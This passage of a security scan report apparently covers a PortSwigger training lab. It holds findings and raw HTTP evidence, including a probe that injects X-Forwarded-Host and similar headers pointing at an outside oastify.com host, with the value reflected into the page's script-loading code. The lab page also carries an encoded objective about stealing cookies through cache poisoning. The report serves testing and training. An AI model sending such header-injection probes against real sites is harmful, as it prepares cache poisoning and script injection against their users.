                            <h3>Giant Pillow Thing</h3>
                            <img src="/resources/images/rating1.png">
                            $48.88
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/72.jpg">
                            <h3>Baby Minding Shoes</h3>
                            <img src="/resources/images/rating1.png">
                            $21.42
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/62.jpg">
                            <h3>Weird Crushes Game</h3>
                            <img src="/resources/images/rating1.png">
                            $33.47
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating5.png">
                            $70.95
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating1.png">
                            $12.02
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/45.jpg">
                            <h3>ZZZZZZ Bed - Your New Home Office</h3>
                            <img src="/resources/images/rating3.png">
                            $29.77
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/18.jpg">
                            <h3>Portable Hat</h3>
                            <img src="/resources/images/rating4.png">
                            $58.70
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                    <script>
                        initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
                    </script>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr61nxhp-31` — `artifacts/_/ev-mr61nxhp-31/`

Request:

```http
GET /?cb=vp2 HTTP/1.1
Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 200
cache-control: no-cache
connection: close
content-encoding: gzip
content-length: 2336
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <script>
            data = {"host":"0a1d009a03d75453819093a800cc00d1.web-security-academy.net","path":"/"}
        </script>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="/resources/js/geolocate.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ade00f003df548e813c92c101a20056.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1kZXNpZ24tZmxhd3MvbGFiLXdlYi1jYWNoZS1wb2lzb25pbmctdG8tZXhwbG9pdC1hLWRvbS12dWxuZXJhYmlsaXR5LXZpYS1hLWNhY2hlLXdpdGgtc3RyaWN0LWNhY2hlYWJpbGl0eS1jcml0ZXJpYQ=='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <div id=shipping-info class=shipping-info>
                        </div>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/40.jpg">
                            <h3>Sarcastic 9 Ball</h3>
                            <img src="/resources/images/rating2.png">
                            $98.00
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $82.92
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/47.jpg">
                            <h3>3D Voice Assistants</h3>
                            <img src="/resources/images/rating5.png">
                            $73.51
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/38.jpg">
                            <h3>Six Pack Beer Belt</h3>
                            <img src="/resources/images/rating5.png">
                            $74.75
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/27.jpg">
                            <h3>The Trolley-ON</h3>
                            <img src="/resources/images/rating1.png">
                            $55.99
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/64.jpg">
                            <h3>Hexbug Battleground Tarantula Double Pack</h3>
                            <img src="/resources/images/rating2.png">
                            $53.83
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating1.png">
                            $69.65
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/57.jpg">
                            <h3>Lightbulb Moments</h3>
                            <img src="/resources/images/rating5.png">
                            $46.31
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/5.jpg">
                            <h3>Cheshire Cat Grin</h3>
                            <img src="/resources/images/rating5.png">
                            $38.41
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/12.jpg">
                            <h3>Hologram Stand In</h3>
                            <img src="/resources/images/rating4.png">
                            $94.96
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/13.jpg">
                            <h3>Inflatable Dartboard</h3>
                            <img src="/resources/images/rating4.png">
                            $66.51
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating4.png">
                            $68.79
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/54.jpg">
                            <h3>Robot Home Security Buddy</h3>
                            <img src="/resources/images/rating1.png">
                            $93.40
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/30.jpg">
                            <h3>Giant Pillow Thing</h3>
                            <img src="/resources/images/rating1.png">
                            $48.88
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/72.jpg">
                            <h3>Baby Minding Shoes</h3>
                            <img src="/resources/images/rating1.png">
                            $21.42
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/62.jpg">
                            <h3>Weird Crushes Game</h3>
                            <img src="/resources/images/rating1.png">
                            $33.47
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating5.png">
                            $70.95
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating1.png">
                            $12.02
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/45.jpg">
                            <h3>ZZZZZZ Bed - Your New Home Office</h3>
                            <img src="/resources/images/rating3.png">
                            $29.77
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/18.jpg">
                            <h3>Portable Hat</h3>
                            <img src="/resources/images/rating4.png">
                            $58.70
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                    <script>
                        initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
                    </script>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr61sl5m-35` — `artifacts/_/ev-mr61sl5m-35/`

Request:

```http
GET / HTTP/1.1
Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 200
age: 22
cache-control: max-age=30
connection: close
content-encoding: gzip
content-length: 2336
content-type: text/html; charset=utf-8
x-cache: hit
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <script>
            data = {"host":"0a1d009a03d75453819093a800cc00d1.web-security-academy.net","path":"/"}
        </script>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="/resources/js/geolocate.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ade00f003df548e813c92c101a20056.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1kZXNpZ24tZmxhd3MvbGFiLXdlYi1jYWNoZS1wb2lzb25pbmctdG8tZXhwbG9pdC1hLWRvbS12dWxuZXJhYmlsaXR5LXZpYS1hLWNhY2hlLXdpdGgtc3RyaWN0LWNhY2hlYWJpbGl0eS1jcml0ZXJpYQ=='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <div id=shipping-info class=shipping-info>
                        </div>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/40.jpg">
                            <h3>Sarcastic 9 Ball</h3>
                            <img src="/resources/images/rating2.png">
                            $98.00
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $82.92
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/47.jpg">
                            <h3>3D Voice Assistants</h3>
                            <img src="/resources/images/rating5.png">
                            $73.51
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/38.jpg">
                            <h3>Six Pack Beer Belt</h3>
                            <img src="/resources/images/rating5.png">
                            $74.75
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/27.jpg">
                            <h3>The Trolley-ON</h3>
                            <img src="/resources/images/rating1.png">
                            $55.99
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/64.jpg">
                            <h3>Hexbug Battleground Tarantula Double Pack</h3>
                            <img src="/resources/images/rating2.png">
                            $53.83
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating1.png">
                            $69.65
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/57.jpg">
                            <h3>Lightbulb Moments</h3>
                            <img src="/resources/images/rating5.png">
                            $46.31
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/5.jpg">
                            <h3>Cheshire Cat Grin</h3>
                            <img src="/resources/images/rating5.png">
                            $38.41
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/12.jpg">
                            <h3>Hologram Stand In</h3>
                            <img src="/resources/images/rating4.png">
                            $94.96
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/13.jpg">
                            <h3>Inflatable Dartboard</h3>
                            <img src="/resources/images/rating4.png">
                            $66.51
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating4.png">
                            $68.79
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/54.jpg">
                            <h3>Robot Home Security Buddy</h3>
                            <img src="/resources/images/rating1.png">
                            $93.40
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/30.jpg">
                            <h3>Giant Pillow Thing</h3>
                            <img src="/resources/images/rating1.png">
                            $48.88
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/72.jpg">
                            <h3>Baby Minding Shoes</h3>
                            <img src="/resources/images/rating1.png">
                            $21.42
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/62.jpg">
                            <h3>Weird Crushes Game</h3>
                            <img src="/resources/images/rating1.png">
                            $33.47
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating5.png">
                            $70.95
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating1.png">
                            $12.02
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/45.jpg">
                            <h3>ZZZZZZ Bed - Your New Home Office</h3>
                            <img src="/resources/images/rating3.png">
                            $29.77
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/18.jpg">
                            <h3>Portable Hat</h3>
                            <img src="/resources/images/rating4.png">
                            $58.70
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                    <script>
                        initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
                    </script>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

<a id="finding-3"></a>

### 3. [LOW] [burp] Strict transport security not enforced (2 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

(confidence: CERTAIN) [+1 more URL(s): https://0a1d009a03d75453819093a800cc00d1.web-security-academy.net/product] @ https://0a1d009a03d75453819093a800cc00d1.web-security-academy.net/login

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr61ken3-2t` — `artifacts/_/ev-mr61ken3-2t/`

Request:

```http
GET /login HTTP/1.1
Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net

GET /login HTTP/1.1
Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 4899

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <script>
            data = {"host":"0a1d009a03d75453819093a800cc00d1.web-security-academy.net","path":"/login"}
        </script>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="/resources/js/geolocate.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ade00f003df548e813c92c101a20056.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1kZXNpZ24tZmxhd3MvbGFiLXdlYi1jYWNoZS1wb2lzb25pbmctdG8tZXhwbG9pdC1hLWRvbS12dWxuZXJhYmlsaXR5LXZpYS1hLWNhY2hlLXdpdGgtc3RyaWN0LWNhY2hlYWJpbGl0eS1jcml0ZXJpYQ=='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <div id=shipping-info class=shipping-info>
                        </div>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <form class=login-form method=POST action="/login">
                            <input required type="hidden" name="csrf" value="QT3HT8r1WTI85CMybo2XKGnSKjRe1o0U">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                    <script>
                        initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
                    </script>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

<a id="finding-4"></a>

### 4. [INFO] [burp] TLS certificate

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The server presented a valid, trusted TLS certificate. This issue is purely informational.<br><br>The server presented the following certificates:<br><br><h4>Server certificate</h4><table><tr><td><b>Issued to:</b>&nbsp;&nbsp;</td><td>*.web-security-academy.net, *.2.web-security-academy.net, *.1.web-security-academy.net, *.3.web-security-academy.net, *.2.h1-web-security-academy.net, *.1.h1-web-security-academy.net, *.h1-web-security-academy.net, *.3.h1-web-security-academy.net</td></tr><tr><td><b>Issued by:</b>&nbsp;&nbsp;</td><td>Amazon RSA 2048 M01</td></tr><tr><td><b>Valid from:</b>&nbsp;&nb @ https://0a1d009a03d75453819093a800cc00d1.web-security-academy.net/

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr61kemt-2s` — `artifacts/_/ev-mr61kemt-2s/`

Request:

```http
GET / HTTP/1.1
Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net
```

Response:

```http
HTTP/1.1 0
```

<a id="finding-5"></a>

### 5. [INFO] [burp✓] Request URL override

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

✅ AI-verified by active re-test: Control (no override) reflected the real lab host; X-Forwarded-Host with two distinct markers (a1/b2) each came back verbatim in data.host, proving request URL/host override reflected unencoded into the response.

The application appears to support the use of a custom HTTP header to override the Host header.<br><br>Burp added the following headers to the request:<br><br>X-Forwarded-Host: o3su0vp8w7jjqtdo7qcbzijfn6tzhw5p6dw0mob.oastify.com<br>X-Host: o3su0vp8w7jjqtdo7qcbzijfn6tzhw5p6dw0mob.oastify.com<br>X-Forwarded-Server: o3su0vp8w7jjqtdo7qcbzijfn6tzhw5p6dw0mob.oastify.com<br><br>A value from these headers was reflected in the response, showing that a header was processed. (confidence: FIRM) @ https://0a1d009a03d75453819093a800cc00d1.web-security-academy.net/

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr61kene-2v` — `artifacts/_/ev-mr61kene-2v/`

Request:

```http
GET / HTTP/1.1
Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net

GET /?3tg2avpc8o=1 HTTP/1.1
Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net
Accept: */*
X-Forwarded-Host: o3su0vp8w7jjqtdo7qcbzijfn6tzhw5p6dw0mob.oastify.com
X-Host: o3su0vp8w7jjqtdo7qcbzijfn6tzhw5p6dw0mob.oastify.com
X-Forwarded-Server: o3su0vp8w7jjqtdo7qcbzijfn6tzhw5p6dw0mob.oastify.com
Connection: close
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 0

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Connection: close
Content-Length: 12365

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <script>
            data = {"host":"o3su0vp8w7jjqtdo7qcbzijfn6tzhw5p6dw0mob.oastify.com","path":"/"}
        </script>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="/resources/js/geolocate.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ade00f003df548e813c92c101a20056.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1kZXNpZ24tZmxhd3MvbGFiLXdlYi1jYWNoZS1wb2lzb25pbmctdG8tZXhwbG9pdC1hLWRvbS12dWxuZXJhYmlsaXR5LXZpYS1hLWNhY2hlLXdpdGgtc3RyaWN0LWNhY2hlYWJpbGl0eS1jcml0ZXJpYQ=='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <div id=shipping-info class=shipping-info>
                        </div>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/40.jpg">
                            <h3>Sarcastic 9 Ball</h3>
                            <img src="/resources/images/rating2.png">
                            $98.00
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $82.92
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/47.jpg">
                            <h3>3D Voice Assistants</h3>
                            <img src="/resources/images/rating5.png">
                            $73.51
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/38.jpg">
